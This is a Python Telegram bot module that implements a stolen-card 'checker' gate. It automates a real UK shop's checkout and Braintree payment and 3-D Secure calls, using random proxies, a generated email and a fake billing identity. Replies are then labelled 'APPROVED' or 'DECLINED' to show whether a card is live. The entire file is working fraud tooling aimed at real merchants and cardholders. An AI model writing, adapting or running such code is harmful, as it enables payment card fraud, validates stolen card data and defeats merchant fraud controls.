import requests as r
from src.extras.checklib import MakeGate, ScrapInfo
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
import string, random, time, rsa, base64, names, json, re
from requests.exceptions import ProxyError, ConnectionError

BIN_API = "https://bins.antipublic.cc/bins/"
name_gate = "Braintree_Charged"
subtype = "$6,40 Charged"
command = "bra"

@Client.on_message(filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False))
async def gateway(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = makeGate.split_card(card)
    card = f'{card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}'
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg)


async def get_live(card, msg):
    session = r.Session()
    email = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    proxies = makeGate.load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)
    session.proxies = proxy

    max_retries = 3
    retry_delay = 3
    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_splited = makeGate.split_card(card)
    ccnum = card_splited[0]
    mes = card_splited[1]
    ano = card_splited[2]
    if len(ano) == 2:
        ano = f'20{card_splited[2]}'
    cvv = card_splited[3]

    initial_time = time.time()
    BIN = ccnum[0:6]
    data_bin = r.get(BIN_API+BIN).json()


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    url = "https://www.medicalsupplies.co.uk/alexandra-workwear-hygienic-overshoes.html"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
    }


    response = session.get(url, headers=headers)

    csrf_match = re.search(r'csrf_token" value="([^"]+)"', response.text)
    csrf_token = csrf_match.group(1)

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccnum}:{mes}:{ano}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['brand']}</code> - <code>{data_bin['type']}</code> - <code>{data_bin['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['country_name']} {data_bin['country_flag']}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    url = "https://www.medicalsupplies.co.uk/alexandra-workwear-hygienic-overshoes.html"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
    }

    data = {
        "quantity": "1",
        "action": "add",
        "pid": "9328",
        "sku": "NU208",
        "frequency": "",
        "csrf_token": csrf_token,
        "addajax": "1",
    }



    res1 = session.post(url, headers=headers, data=data,)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    url = "https://www.medicalsupplies.co.uk/checkout.html"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
    }

    data = {
        "email": email,
        "title": "0",
        "firstname": "mario",
        "lastname": "ops",
        "companyname": "",
        "address1": "Flat 1",
        "address2": "29-31 High Street",
        "towncity": "Cardiff",
        "county": "Caerdydd",
        "postcode": "CF10 1PU",
        "country": "GB",
        "GG": "0",
        "IE": "1",
        "IM": "1",
        "JE": "0",
        "GB": "0",
        "telephone": "02920224817",
        "vatnum": "",
        "eori": "",
        "reference": "",
        "alt_title": "0",
        "alt_firstname": "",
        "alt_lastname": "",
        "alt_companyname": "",
        "alt_address1": "",
        "alt_address2": "",
        "alt_towncity": "",
        "alt_county": "",
        "alt_postcode": "",
        "alt_country": "GB",
        "delivery": "1",
        "personal_information": "x",
        "noaccount": "x",
        "nosubmit": "0",
        "remove": "0",
    }



    response = session.post(url, headers=headers, data=data,)
    tok_match = re.search(r'authorization: \'(.+?)\'', response.text)
    response_data = response.text
    tok = tok_match.group(1) if tok_match else None
    start_tag = '</div></div></div></form><form method="post" action="/checkout/action/return/?oid='
    end_tag = '" name='
    start_index = response_data.find(start_tag) +len(start_tag)
    end_index = response_data.find(end_tag, start_index)
    parsed_message = response_data[start_index:end_index]
    oid = parsed_message if parsed_message else None
    decoded_tok = base64.b64decode(tok).decode('utf-8')
    auth_match = json.loads(decoded_tok).get('authorizationFingerprint')
    auth = auth_match if auth_match else None


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    url = "https://www.medicalsupplies.co.uk/checkout.html"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
    }

    data = {
        "payment_method": "ccp",
        "payment_choice": "1",
        "payment_information": "choice",
    }


    res2 = session.post(url, headers=headers, data=data,)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    url = "https://payments.braintree-api.com/graphql"


    headers = {
        "Host": "payments.braintree-api.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth}",
        "Braintree-Version": "2018-05-10",
        "Origin": "https://assets.braintreegateway.com",
        "Connection": "keep-alive",
        "Referer": "https://assets.braintreegateway.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "Accept-Encoding": "gzip, deflate",
    }

    data = {
        "clientSdkMetadata": {
        "source": "client",
        "integration": "custom",
        "sessionId": "0d3c160c-1070-499d-95d0-f5fa9686d68b"
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) { token creditCard {   bin   brandCode   last4   cardholderName   expirationMonth  expirationYear  binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId   } }   } }",
        "variables": {
        "input": {
        "creditCard": {
        "number": ccnum,
        "expirationMonth": mes,
        "expirationYear": ano,
        "cvv": cvv
        },
        "options": {
        "validate": False
        }
        }
        },
        "operationName": "TokenizeCreditCard"
    }


    response = session.post(url, headers=headers, json=data,)
    toke = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('token')
    brandCode = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('brandCode')
    Bin = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('bin')
    last4 = json.loads(response.text).get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {}).get('last4')


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Sixth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    url = f"https://api.braintreegateway.com/merchants/s797gcfwfvjxnwqb/client_api/v1/payment_methods/{toke}/three_d_secure/lookup"
    headers = {
        "Host": "api.braintreegateway.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Content-Length": "1521",
        "Origin": "https://www.medicalsupplies.co.uk",
        "Connection": "keep-alive",
        "Referer": "https://www.medicalsupplies.co.uk/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "TE": "trailers",
    }

    data = {
        "amount": 13.93,
        "additionalInfo": {
        "billingLine1": "Flat 1",
        "billingLine2": "29-31 High Street",
        "billingCity": "Cardiff",
        "billingState": "Caerdydd",
        "billingPostalCode": "CF10 1PU",
        "billingCountryCode": "GB",
        "billingPhoneNumber": "02920224817",
        "billingGivenName": "Mario",
        "billingSurname": "Ops",
        "email": email
        },
        "bin": Bin,
        "dfReferenceId": "0_e75b1e79-6216-410f-912e-7e609e39ac0c",
        "clientMetadata": {
        "requestedThreeDSecureVersion": "2",
        "sdkVersion": "web/3.94.0",
        "cardinalDeviceDataCollectionTimeElapsed": 574,
        "issuerDeviceDataCollectionTimeElapsed": 3188,
        "issuerDeviceDataCollectionResult": True
        },
        "authorizationFingerprint": auth,
        "braintreeLibraryVersion": "braintree/web/3.94.0",
        "_meta": {
        "merchantAppId": "www.medicalsupplies.co.uk",
        "platform": "web",
        "sdkVersion": "3.94.0",
        "source": "client",
        "integration": "custom",
        "integrationType": "custom",
        "sessionId": "0d3c160c-1070-499d-95d0-f5fa9686d68b"
        }
    }


    res6 = session.post(url, headers=headers, json=data,)

    response_json = res6.json()
    nonce = response_json["paymentMethod"]["nonce"]
    cardType = response_json["paymentMethod"]["details"]["cardType"]
    last2 = response_json["paymentMethod"]["details"]["lastTwo"]
    prepaid = response_json["paymentMethod"]["binData"]["prepaid"]
    healthcare = response_json["paymentMethod"]["binData"]["healthcare"]
    debit = response_json["paymentMethod"]["binData"]["debit"]
    durbinRegulated = response_json["paymentMethod"]["binData"]["durbinRegulated"]
    commercial = response_json["paymentMethod"]["binData"]["commercial"]
    payroll = response_json["paymentMethod"]["binData"]["payroll"]
    issuingBank = response_json["paymentMethod"]["binData"]["issuingBank"]
    countryOfIssuance = response_json["paymentMethod"]["binData"]["countryOfIssuance"]


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Seventh request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



    url = f"https://www.medicalsupplies.co.uk/checkout/action/return/?oid={oid}"
    headers = {
        "Host": "www.medicalsupplies.co.uk",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "324",
        "Origin": "https://www.medicalsupplies.co.uk",
        "Connection": "keep-alive",
        "Referer": "https://www.medicalsupplies.co.uk/checkout.html",
        "Cookie": "PHPSESSID=aaf799078cca3cf5e64a82be834118f0; BPSESSID=aaf799078cca3cf5e64a82be834118f0; _gcl_au=1.1.1716430907.1702827717; _ga_E6SZ919XYF=GS1.1.1702827716.1.1.1702828411.59.0.0; _ga=GA1.3.276158566.1702827717; _gid=GA1.3.1117692363.1702827718",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
    }
    data = {
        "braintree_confirm": "1",
        "bt_nonce": nonce,
        "bt_device": 'device_session_id":"99208dfba519bcbd12cdbffc87d9b9af","fraud_merchant_id":null,"correlation_id":"4094d638b2086518a43e0f2873bd3185',
        "bt_3dstatus": "authenticate_attempt_successful",
        "bt_3derror": "",
        "bt_3dmessage": "",
        "bt_store": ""
    }



    res7 = session.post(url, headers=headers, data=data)
    response_data = res7.text
    start_tag = '.</p><p><i>'
    end_tag = '.</i></p><p>'
    start_index = response_data.find(start_tag) +len(start_tag)
    end_index = response_data.find(end_tag, start_index)
    parsed_message = response_data[start_index:end_index]
    code = parsed_message if parsed_message else None


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Response Code ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    if "Card Issuer Declined CVV" in code:
            msgx = "APPROVED CCN✅"
            respuesta = "Card Issuer Declined CVV"

    elif "Insufficient Funds" in code:
            msgx = "APPROVED CCV✅"
            respuesta = "Insufficient Funds"

    elif "Gateway Rejected: avs" in code:
            msgx = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs"

    elif "Gateway Rejected: avs_and_cvv" in code:
            msgx = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs_and_cvv"

    else:
            respuesta = code
            msgx = "DECLINED ❌"

    data = r.get(BIN_API+BIN).json()
    final_time = time.time() - initial_time

    card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
    await msg.edit_text(card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
